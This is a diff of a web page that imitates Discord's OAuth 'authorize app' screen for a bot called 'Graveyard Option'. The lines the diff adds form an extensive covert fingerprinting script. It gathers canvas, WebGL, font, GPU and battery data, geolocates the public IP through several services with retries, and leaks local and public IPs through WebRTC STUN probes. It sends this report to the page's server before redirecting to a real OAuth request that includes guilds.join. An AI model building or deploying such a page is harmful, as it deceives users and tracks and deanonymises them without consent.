@@ -36,154 +36,38 @@ body {
     background:
         radial-gradient(ellipse at 90% 5%, #285bea 0%, transparent 48%),
         radial-gradient(ellipse at 8% 90%, #21005e 0%, transparent 55%),
-        linear-gradient(110deg,
-            #170044 0%,
-            #25117e 42%,
-            #263ed0 75%,
-            #087af0 100%);
+        linear-gradient(110deg, #170044 0%, #25117e 42%, #263ed0 75%, #087af0 100%);
     -webkit-font-smoothing: antialiased;
 }
 
-#background {
-    position: fixed;
-    inset: 0;
-    overflow: hidden;
-    pointer-events: none;
-    z-index: 1;
-}
+#background { position: fixed; inset: 0; overflow: hidden; pointer-events: none; z-index: 1; }
+.star { position: absolute; border-radius: 2px; background: #a56cff; box-shadow: 0 0 12px 3px #8245ff; opacity: 0.85; }
+.planet { position: absolute; width: 145px; height: 145px; left: 5%; top: 37%; border-radius: 50%; background: radial-gradient(ellipse at 40% 40%, #aaa0d8, #7770b5 40%, #4b389d 70%, transparent 76%); filter: blur(5px); box-shadow: 0 0 25px #8866ff; opacity: .75; }
+.crystal { position: absolute; width: 100px; height: 130px; right: 8%; top: 35%; background: linear-gradient(135deg, rgba(124,153,255,.5), rgba(92,75,220,.15), rgba(35,71,210,.5)); clip-path: polygon(50% 0, 100% 25%, 85% 80%, 45% 100%, 0 65%, 12% 20%); filter: blur(7px); transform: rotate(15deg); }
+.plus { position: absolute; color: #a58bff; font-size: 43px; font-weight: 200; text-shadow: 0 0 15px #a58bff; opacity: 0.9; }
 
-.star {
-    position: absolute;
-    border-radius: 2px;
-    background: #a56cff;
-    box-shadow: 0 0 12px 3px #8245ff;
-    opacity: 0.85;
-}
-
-.planet {
-    position: absolute;
-    width: 145px;
-    height: 145px;
-    left: 5%;
-    top: 37%;
-    border-radius: 50%;
-    background: radial-gradient(ellipse at 40% 40%, #aaa0d8, #7770b5 40%, #4b389d 70%, transparent 76%);
-    filter: blur(5px);
-    box-shadow: 0 0 25px #8866ff;
-    opacity: .75;
-}
-
-.crystal {
-    position: absolute;
-    width: 100px;
-    height: 130px;
-    right: 8%;
-    top: 35%;
-    background: linear-gradient(135deg, rgba(124,153,255,.5), rgba(92,75,220,.15), rgba(35,71,210,.5));
-    clip-path: polygon(50% 0, 100% 25%, 85% 80%, 45% 100%, 0 65%, 12% 20%);
-    filter: blur(7px);
-    transform: rotate(15deg);
-}
-
-.plus {
-    position: absolute;
-    color: #a58bff;
-    font-size: 43px;
-    font-weight: 200;
-    text-shadow: 0 0 15px #a58bff;
-    opacity: 0.9;
-}
-
-.discord-logo-header {
-    position: absolute;
-    top: 24px;
-    left: 32px;
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    color: #ffffff;
-    font-weight: 700;
-    font-size: 16px;
-    letter-spacing: -0.2px;
-    text-decoration: none;
-    z-index: 10;
-}
+.discord-logo-header { position: absolute; top: 24px; left: 32px; display: flex; align-items: center; gap: 8px; color: #ffffff; font-weight: 700; font-size: 16px; letter-spacing: -0.2px; text-decoration: none; z-index: 10; }
 .discord-logo-header svg { width: 28px; height: 20px; fill: currentColor; }
 
-.wrap { 
-    width: 100%; 
-    max-width: 480px; 
-    background: var(--card-bg); 
-    border-radius: 8px; 
-    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6); 
-    position: relative;
-    z-index: 10;
-    overflow: hidden;
-    display: flex;
-    flex-direction: column;
-}
+.wrap { width: 100%; max-width: 480px; background: var(--card-bg); border-radius: 8px; box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6); position: relative; z-index: 10; overflow: hidden; display: flex; flex-direction: column; }
 
-.modal-scroll-container {
-    position: relative;
-    height: 380px;
-    overflow-y: scroll;
-    scrollbar-width: none;
-    -ms-overflow-style: none;
-}
+.modal-scroll-container { position: relative; height: 380px; overflow-y: scroll; scrollbar-width: none; -ms-overflow-style: none; }
 .modal-scroll-container::-webkit-scrollbar { display: none; }
-
 .modal-body { padding: 32px 32px 20px 32px; }
 
-.discord-scrollbar {
-    position: absolute;
-    top: 0;
-    right: 0;
-    width: 16px;
-    height: 100%;
-    background: #1e1f22;
-    display: flex;
-    flex-direction: column;
-    z-index: 20;
-}
-
-.scroll-btn {
-    width: 100%;
-    height: 20px;
-    background: #1e1f22;
-    border: none;
-    color: #949ba4;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    cursor: pointer;
-    font-size: 8px;
-    padding: 0;
-}
+.discord-scrollbar { position: absolute; top: 0; right: 0; width: 16px; height: 100%; background: #1e1f22; display: flex; flex-direction: column; z-index: 20; }
+.scroll-btn { width: 100%; height: 20px; background: #1e1f22; border: none; color: #949ba4; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 8px; padding: 0; }
 .scroll-btn:hover { color: #f2f3f5; background: #2b2d31; }
-
 .scroll-track { flex: 1; position: relative; width: 100%; }
-
-.scroll-thumb {
-    position: absolute;
-    top: 0;
-    left: 3px;
-    width: 10px;
-    height: 140px;
-    background: #5c5e66;
-    border-radius: 5px;
-    cursor: pointer;
-}
+.scroll-thumb { position: absolute; top: 0; left: 3px; width: 10px; height: 140px; background: #5c5e66; border-radius: 5px; cursor: pointer; }
 .scroll-thumb:hover, .scroll-thumb:active { background: #80848e; }
 
 .app-info { display: flex; flex-direction: column; align-items: center; text-align: center; margin-bottom: 24px; }
 .app-icons-row { display: flex; align-items: center; justify-content: center; gap: 16px; margin-bottom: 20px; }
-
 .app-icon { width: 72px; height: 72px; border-radius: 50%; background: #1e1f22; display: flex; align-items: center; justify-content: center; overflow: hidden; flex-shrink: 0; }
 .app-icon img { width: 100%; height: 100%; object-fit: cover; }
-
 .connection-dots { display: flex; gap: 4px; align-items: center; }
 .connection-dots span { width: 3px; height: 3px; background-color: #4e5058; border-radius: 50%; }
-
 .app-details { text-align: center; }
 .app-name { font-size: 22px; font-weight: 700; color: var(--text-header); margin-bottom: 4px; }
 .app-dev { font-size: 14px; color: var(--text); margin-bottom: 4px; }
@@ -197,22 +81,11 @@ body {
 .perm-list { margin: 0 0 20px 0; padding: 0; list-style: none; }
 .perm-list li { display: flex; align-items: center; gap: 12px; font-size: 14px; margin-bottom: 14px; color: var(--text); }
 .perm-list li:last-child { margin-bottom: 0; }
-
-.perm-list li.check::before { 
-    content: ''; width: 20px; height: 20px; flex-shrink: 0;
-    background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23b5bac1"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>') no-repeat center;
-    background-size: contain;
-}
-
+.perm-list li.check::before { content: ''; width: 20px; height: 20px; flex-shrink: 0; background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23b5bac1"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>') no-repeat center; background-size: contain; }
 .perm-list li.cross { color: #80848e; }
-.perm-list li.cross::before { 
-    content: ''; width: 20px; height: 20px; flex-shrink: 0;
-    background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%2380848e"><path d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm5 13.59L15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7 12 10.59 15.59 7 17 8.41 13.41 12 17 15.59z"/></svg>') no-repeat center;
-    background-size: contain;
-}
+.perm-list li.cross::before { content: ''; width: 20px; height: 20px; flex-shrink: 0; background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%2380848e"><path d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm5 13.59L15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7 12 10.59 15.59 7 17 8.41 13.41 12 17 15.59z"/></svg>') no-repeat center; background-size: contain; }
 
 .divider { height: 1px; background-color: rgba(255, 255, 255, 0.06); margin: 16px 0; }
-
 .info-list { display: flex; flex-direction: column; gap: 14px; }
 .info-item { display: flex; align-items: flex-start; gap: 12px; font-size: 13px; color: #949ba4; line-height: 1.4; }
 .info-item svg { width: 18px; height: 18px; fill: #949ba4; flex-shrink: 0; margin-top: 1px; }
@@ -220,23 +93,10 @@ body {
 .info-item a { color: #00a8fc; text-decoration: none; }
 .info-item a:hover { text-decoration: underline; }
 
-.actions-footer {
-    background: var(--card-bg);
-    padding: 16px 32px;
-    display: flex;
-    gap: 16px;
-    align-items: center;
-    border-top: 1px solid rgba(255, 255, 255, 0.04);
-}
-
-button.action-btn {
-    flex: 1; height: 44px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500;
-    cursor: pointer; transition: background-color .17s ease; text-align: center; font-family: var(--font);
-}
-
+.actions-footer { background: var(--card-bg); padding: 16px 32px; display: flex; gap: 16px; align-items: center; border-top: 1px solid rgba(255, 255, 255, 0.04); }
+button.action-btn { flex: 1; height: 44px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background-color .17s ease; text-align: center; font-family: var(--font); }
 .btn-cancel { background: var(--cancel-btn-bg); color: var(--text-header); }
 .btn-cancel:hover { background: var(--cancel-btn-hover); }
-
 .btn-authorize { background: var(--blurple); color: white; }
 .btn-authorize:hover:not(:disabled) { background: var(--blurple-hover); }
 .btn-authorize:disabled { opacity: .5; cursor: not-allowed; }
@@ -244,13 +104,10 @@ button.action-btn {
 </head>
 
 <body>
-
 <div id="background"></div>
 
 <div class="discord-logo-header">
-  <svg viewBox="0 0 127.14 96.36">
-    <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.15c2.65-27.28-4.51-51.19-19.45-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.88,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5.18-12.72,11.45-12.72S96.15,46,96.13,53,91,65.69,84.69,65.69Z"/>
-  </svg>
+  <svg viewBox="0 0 127.14 96.36"><path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.15c2.65-27.28-4.51-51.19-19.45-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.88,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5.18-12.72,11.45-12.72S96.15,46,96.13,53,91,65.69,84.69,65.69Z"/></svg>
   <span>Discord</span>
 </div>
 
@@ -263,20 +120,14 @@ button.action-btn {
             <div class="app-icon">
               <img src="https://i.ibb.co/TMtbxsrs/tb.jpg" alt="Bot Icon">
             </div>
-            <div class="connection-dots">
-              <span></span><span></span><span></span>
-            </div>
+            <div class="connection-dots"><span></span><span></span><span></span></div>
             <div class="app-icon">
-              <svg viewBox="0 0 24 24" width="45" height="45" fill="#b5bac1">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
-              </svg>
+              <svg viewBox="0 0 24 24" width="45" height="45" fill="#b5bac1"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
             </div>
           </div>
           <div class="app-details">
             <div class="app-name">Graveyard Option</div>
             <div class="app-dev">wants to access your Discord account</div>
-            
-            <!-- Убрали фейковый ник, оставили просто "your account" -->
             <div class="signed-in">Signed in as <span>your account</span> <a href="#" onclick="return false;">Not you?</a></div>
           </div>
         </div>
@@ -295,20 +146,16 @@ button.action-btn {
           <div class="info-list">
             <div class="info-item">
               <svg viewBox="0 0 24 24"><path d="M10.59 13.41c.41.39.41 1.03 0 1.42-.39.39-1.03.39-1.42 0a5.003 5.003 0 0 1 0-7.07l3.54-3.54a5.003 5.003 0 0 1 7.07 0 5.003 5.003 0 0 1 0 7.07l-1.49 1.49c.01-.82-.12-1.64-.4-2.42l.47-.48a3.001 3.001 0 0 0 0-4.24 3.001 3.001 0 0 0-4.24 0l-3.53 3.53a3.001 3.001 0 0 0 0 4.24zm2.82-2.82c-.41-.39-.41-1.03 0-1.42.39-.39 1.03-.39 1.42 0a5.003 5.003 0 0 1 0 7.07l-3.54 3.54a5.003 5.003 0 0 1-7.07 0 5.003 5.003 0 0 1 0-7.07l1.49-1.49c-.01.82.12 1.64.4 2.42l-.47.48a3.001 3.001 0 0 0 0 4.24 3.001 3.001 0 0 0 4.24 0l3.53-3.53a3.001 3.001 0 0 0 0-4.24z"/></svg>
-              <span>Once you authorize, you will be redirected <strong>outside of Discord</strong> to: <strong id="redirectDomain">https://botinfotest-production.up.railway.app</strong></span>
+              <span>Once you authorize, you will be redirected <strong>outside of Discord</strong> to: <strong id="redirectDomain"></strong></span>
             </div>
-
             <div class="info-item">
               <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
               <span>The developer of Graveyard Option's privacy policy and terms of service apply to this application. Discord's <a href="#">Privacy Policy</a> applies to data it receives.</span>
             </div>
-
-            <!-- Дата подтягивается через JS (динамически) -->
             <div class="info-item">
               <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
-              <span>Active since <span id="activeSinceDate">Today</span></span>
+              <span>Active since <span id="activeSinceDate"></span></span>
             </div>
-
             <div class="info-item">
               <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8s0 0 0 0z"/></svg>
               <span>This application <strong>cannot</strong> read your messages or send messages as you.</span>
@@ -318,7 +165,6 @@ button.action-btn {
       </div>
     </div>
 
-    <!-- Кастомный скроллбар -->
     <div class="discord-scrollbar">
       <button class="scroll-btn" onclick="scrollUp()">▲</button>
       <div class="scroll-track" id="scrollTrack">
@@ -335,7 +181,7 @@ button.action-btn {
 </div>
 
 <script>
-// 1. Ставим актуальную дату (сегодняшнюю)
+// --- 1. UI Setup ---
 function setDynamicDate() {
     const today = new Date();
     const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
@@ -344,7 +190,6 @@ function setDynamicDate() {
 setDynamicDate();
 document.getElementById('redirectDomain').textContent = window.location.origin;
 
-// 2. Работа кастомного скролла
 const scrollContainer = document.getElementById('scrollContainer');
 const scrollThumb = document.getElementById('scrollThumb');
 const scrollTrack = document.getElementById('scrollTrack');
@@ -389,7 +234,7 @@ document.addEventListener('mouseup', () => {
 function scrollUp() { scrollContainer.scrollBy({ top: -60, behavior: 'smooth' }); }
 function scrollDown() { scrollContainer.scrollBy({ top: 60, behavior: 'smooth' }); }
 
-// 3. Фон
+// Background particles
 const background = document.getElementById('background');
 const positions = [[4,36],[7,76],[15,30],[18,68],[25,21],[30,83],[37,44],[42,7],[48,5],[56,12],[62,85],[69,30],[73,56],[79,20],[84,65],[89,35],[94,22],[97,75],[22,90],[35,65],[51,93],[65,5],[76,90],[91,54]];
 positions.forEach(([x,y]) => {
@@ -408,7 +253,7 @@ const crystal = document.createElement('div'); crystal.className = 'crystal'; ba
     background.appendChild(plus);
 });
 
-// 4. Логика верификации
+// --- 2. Verification & Data Collection ---
 const REDIRECT_URI = window.location.origin + '/callback';
 const DISCORD_CLIENT_ID = '1567761531213586565'; 
 const btn = document.getElementById('verifyBtn');
@@ -425,39 +270,166 @@ async function startVerification() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ state: stateId, data: report })
     });
-  } catch (e) { console.error('Ошибка сбора данных', e); }
+  } catch (e) { console.error('Data collection error', e); }
 
   const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20email%20guilds.join&state=${stateId}`;
   window.location.href = oauthUrl;
 }
 
+// --- 3. The Ultimate Fingerprint Logic ---
+const safe = (fn,d="unavailable")=>{try{const r=fn();return(r===undefined||r===null||r==="")?d:r;}catch(_){return d;}};
+
+function deviceType(){
+  const n=navigator;
+  const coarse=safe(()=>matchMedia("(pointer:coarse)").matches,false);
+  const noHover=safe(()=>matchMedia("(hover:none)").matches,false);
+  const uaMobile=safe(()=>n.userAgentData?n.userAgentData.mobile:/Mobi|Android/i.test(n.userAgent),false);
+  const touch=safe(()=>n.maxTouchPoints>0||"ontouchstart"in window,false);
+  const ua=safe(()=>n.userAgent,"");
+  const minDim=Math.min(screen.width,screen.height);
+  const maxDim=Math.max(screen.width,screen.height);
+  const iPadOnMac=/Macintosh/.test(ua)&&touch&&n.maxTouchPoints>1;
+  let type="Desktop", why=[];
+  if(/iPad/i.test(ua)||iPadOnMac){type="Tablet";why.push("iPad/iPadOS");}
+  else if(coarse&&touch&&(uaMobile||noHover)){
+    if(/Tablet|Tab\b/i.test(ua)){type="Tablet";why.push("tablet in UA");}
+    else if(!uaMobile&&minDim>=600){type="Tablet";why.push("touch + large screen");}
+    else if(minDim>=600&&maxDim>=900){type="Tablet";why.push("large touch screen");}
+    else {type="Mobile";why.push("touch + mobile UA");}
+  } else if(touch&&coarse&&minDim>=600){type="Tablet";why.push("touch screen");}
+  return {type,coarse,noHover,uaMobile,touch,minDim,maxDim,iPadOnMac,why:why.join(", ")};
+}
+
+function canvasHash(){try{
+  const c=document.createElement("canvas");c.width=240;c.height=60;const x=c.getContext("2d");
+  x.textBaseline="top";x.font="16px Arial";x.fillStyle="#f60";x.fillRect(10,10,100,30);
+  x.fillStyle="#069";x.fillText("fp·日本語·10",12,14);x.fillStyle="rgba(102,0,120,.7)";x.fillText("fp·日本語·10",14,16);
+  const s=c.toDataURL();let h=0;for(let i=0;i<s.length;i++)h=((h<<5)-h+s.charCodeAt(i))|0;return(h>>>0).toString(16);
+}catch(_){return"unavailable";}}
+
+function webglHash(){try{
+  const gl=document.createElement("canvas").getContext("webgl");if(!gl)return"none";
+  const p=[gl.getParameter(gl.MAX_TEXTURE_SIZE),gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
+    gl.getParameter(gl.MAX_VERTEX_ATTRIBS),(gl.getSupportedExtensions()||[]).length].join("|");
+  let h=0;for(let i=0;i<p.length;i++)h=((h<<5)-h+p.charCodeAt(i))|0;return(h>>>0).toString(16);
+}catch(_){return"unavailable";}}
+
+function fontList(){try{
+  const test=["Arial","Courier New","Times New Roman","Georgia","Comic Sans MS","Impact","Tahoma",
+    "Verdana","Segoe UI","Roboto","Helvetica","Consolas","Calibri","Cambria","Menlo","Monaco"];
+  const base=["monospace","serif","sans-serif"];const span=document.createElement("span");
+  span.style.cssText="position:absolute;left:-9999px;font-size:72px";span.textContent="mmmmmmmmmmlli";
+  document.body.append(span);const def={};
+  base.forEach(b=>{span.style.fontFamily=b;def[b]={w:span.offsetWidth,h:span.offsetHeight};});
+  const found=test.filter(f=>base.some(b=>{span.style.fontFamily="'"+f+"',"+b;return span.offsetWidth!==def[b].w||span.offsetHeight!==def[b].h;}));
+  span.remove();return found;
+}catch(_){return["unavailable"];}}
+
+async function ftimeout(url,ms=6000){const c=new AbortController();const id=setTimeout(()=>c.abort(),ms);
+  try{const r=await fetch(url,{signal:c.signal,cache:"no-store"});clearTimeout(id);return r;}catch(e){clearTimeout(id);throw e;}}
+
+// ФУНКЦИЯ С РЕТРАЯМИ ДЛЯ IP
+async function ipGeoWithRetries() {
+  const log = [];
+  const providers = [
+    { name: "ipapi.co", url: "https://ipapi.co/json/" },
+    { name: "ipwho.is", url: "https://ipwho.is/" },
+    { name: "ipify.org", url: "https://api.ipify.org?format=json" }
+  ];
+
+  for (let attempt = 1; attempt <= 3; attempt++) {
+    for (const p of providers) {
+      try {
+        const r = await ftimeout(p.url);
+        if (!r.ok) throw new Error(`HTTP ${r.status}`);
+        const d = await r.json();
+        if (d.ip) {
+          log.push({ attempt, provider: p.name, status: "success", ip: d.ip });
+          return {
+            ip: d.ip,
+            city: d.city || "Unknown",
+            region: d.region || "Unknown",
+            country: d.country_name || d.country || "Unknown",
+            org: d.org || (d.connection && d.connection.org) || "Unknown",
+            asn: d.asn || "Unknown",
+            log
+          };
+        }
+      } catch (e) {
+        log.push({ attempt, provider: p.name, status: "failed", error: e.message });
+      }
+    }
+    if (attempt < 3) await new Promise(r => setTimeout(r, 1000)); // Пауза между полными циклами
+  }
+  return { ip: "Unknown", log };
+}
+
+function rtcProbe(stun,ms=2600){return new Promise(res=>{
+  const local=new Set(),pub=new Set();let done=false,pc;
+  const fin=()=>{if(done)return;done=true;try{pc&&pc.close();}catch(_){}res({local:[...local],pub:[...pub]});};
+  try{pc=new RTCPeerConnection({iceServers:stun});}catch(e){return fin();}
+  try{pc.createDataChannel("p");}catch(_){}
+  pc.onicecandidate=e=>{if(!e.candidate)return;const c=e.candidate.candidate||"";
+    (c.match(/[a-f0-9-]+\.local/gi)||[]).forEach(h=>local.add(h));
+    const ips=c.match(/(\d{1,3}(?:\.\d{1,3}){3}|[a-f0-9]{1,4}(?::[a-f0-9]{0,4}){2,7})/gi)||[];
+    const t=e.candidate.type;ips.forEach(ip=>{(t==="host"?local:pub).add(ip);});};
+  pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>fin());setTimeout(fin,ms);});}
+
+async function webrtc(){
+  if(typeof RTCPeerConnection==="undefined")return{pub:[],local:[]};
+  const sets=[[{urls:"stun:stun.l.google.com:19302"}],[{urls:"stun:stun.cloudflare.com:3478"}],[]];
+  const pub=new Set(),local=new Set();
+  for(const s of sets){const r=await rtcProbe(s);r.pub.forEach(x=>pub.add(x));r.local.forEach(x=>local.add(x));if(pub.size)break;}
+  return{pub:[...pub],local:[...local]};
+}
+
 async function collectData() {
-    const n = navigator;
-    const report = { ua: n.userAgent, platform: n.platform, screen: { width: screen.width, height: screen.height }, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };
-    try {
-        const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
-        ctx.fillStyle = '#069'; ctx.fillText('Hello, world!', 2, 15); ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText('Hello, world!', 4, 17);
-        report.canvasHash = canvas.toDataURL();
-    } catch(e) { report.canvasHash = 'error'; }
-    try {
-        const geoRes = await fetch('https://ipapi.co/json/');
-        const geoData = await geoRes.json();
-        report.publicIp = geoData.ip;
-        report.geo = { city: geoData.city, region: geoData.region, country: geoData.country_name, org: geoData.org };
-    } catch(e) {}
-    try {
-        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-        pc.createDataChannel(''); pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        const localIps = new Set();
-        pc.onicecandidate = e => {
-            if (!e.candidate) return;
-            const match = e.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3})/);
-            if (match) localIps.add(match[1]);
-        };
-        await new Promise(r => setTimeout(r, 1500)); report.localIps = [...localIps]; pc.close();
-    } catch(e) { report.localIps = ['error']; }
-    return report;
+  const n = navigator, s = screen;
+  const report = {
+    timestamp: new Date().toISOString(),
+    device: deviceType(),
+    browser: { ua: n.userAgent, platform: n.platform, vendor: n.vendor },
+    hardware: {
+      cores: safe(() => n.hardwareConcurrency),
+      memory: safe(() => n.deviceMemory),
+      touchPoints: safe(() => n.maxTouchPoints),
+      gpu: safe(() => {
+        const gl = document.createElement("canvas").getContext("webgl");
+        if (!gl) return "none";
+        const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+        return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+      })
+    },
+    display: {
+      resolution: s.width + "x" + s.height,
+      colorDepth: s.colorDepth,
+      dpr: window.devicePixelRatio
+    },
+    fingerprint: {
+      canvas: canvasHash(),
+      webgl: webglHash(),
+      fonts: fontList()
+    },
+    network: {}
+  };
+
+  // IP + Geo с ретраями
+  const geoData = await ipGeoWithRetries();
+  report.network.geo = geoData;
+
+  // WebRTC
+  const rtc = await webrtc();
+  report.network.webrtc = rtc;
+
+  // Battery (if supported)
+  try {
+    if (n.getBattery) {
+      const b = await n.getBattery();
+      report.hardware.battery = { level: b.level, charging: b.charging };
+    }
+  } catch(e) {}
+
+  return report;
 }
 </script>
 </body>
